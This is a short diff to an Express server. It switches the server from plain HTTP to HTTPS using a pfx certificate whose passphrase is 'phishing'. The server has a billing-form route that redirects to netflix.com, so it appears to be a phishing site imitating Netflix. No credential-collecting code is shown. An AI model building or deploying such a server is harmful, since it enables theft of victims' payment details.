@@ -2,6 +2,8 @@ const express = require('express');
 const bodyParser = require('body-parser');
 const fs = require('fs');
 const exp = require('constants');
+const https = require('https');
+
 
 
 const app = express();
@@ -54,7 +56,19 @@ app.post('/billing_form', function(req, res) {
   res.redirect('https://netflix.com/');
 });
 
-app.listen(port, function (err) {
+// app.listen(port, function (err) {
+//     if (err) console.log(err);
+//     console.log("Server listening on PORT", port);
+// });
+
+const options = {
+    // key: fs.readFileSync('localhost.key'),
+    // cert: fs.readFileSync('localhost.crt')
+    pfx: fs.readFileSync('localhost.pfx'),
+    passphrase: 'phishing'
+  };
+  
+https.createServer(options, app).listen(port, function(err)  {
     if (err) console.log(err);
-    console.log("Server listening on PORT", port);
+    console.log(`Server listening on port ${port}`);
 });
